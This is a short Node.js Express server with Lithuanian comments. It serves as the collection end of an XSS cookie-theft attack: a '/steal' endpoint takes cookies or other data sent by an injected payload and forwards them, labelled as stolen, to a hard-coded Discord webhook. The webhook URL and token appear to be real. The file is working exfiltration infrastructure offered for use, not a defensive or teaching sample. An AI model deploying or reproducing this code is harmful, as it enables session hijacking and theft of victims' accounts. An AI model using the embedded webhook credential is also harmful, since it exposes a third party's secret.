// Tai yra mūsų tarpinis serveris
const express = require('express');
const app = express();

// Discord webhook URL - įkelk SAVO URL čia
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1496932097246499090/__PgEXEetM1ZSv02o5i9xx69kgkNrjaaaQsmmKm4c8ORZKggHhuxzu_yDrg-FfXB6D2H';

// Middleware, kuris leidžia skaityti JSON ir tekstą iš užklausų
app.use(express.json());
app.use(express.text());

// Čia serveris priima visas POST užklausas iš XSS payload'o
app.post('/steal', async (req, res) => {
  let dataToSend = '';
  
  // Patikrina ar gautas JSON ir ar jame yra 'cookie' laukas
  if (req.body && req.body.cookie) {
    dataToSend = `🍪 **Pavogtas slapukas**: ${req.body.cookie}`;
  } 
  // Jei ne JSON, tai tikriausiai tiesiog tekstas
  else if (typeof req.body === 'string') {
    dataToSend = `📄 **Pavogti duomenys**: ${req.body}`;
  }

  // Jei gauti duomenys, siunčiame juos į Discord webhook'ą
  if (dataToSend) {
    try {
      const fetch = (await import('node-fetch')).default;
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: dataToSend })
      });
      res.status(200).send('Duomenys nusiųsti į Discord!');
    } catch (error) {
      console.error('Klaida siunčiant į Discord:', error);
      res.status(500).send('Vidinė serverio klaida');
    }
  } else {
    res.status(400).send('Nėra duomenų siuntimui');
  }
});

// Paleidžiame serverį
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Proxy serveris veikia ir klausosi ${port} prievado`);
});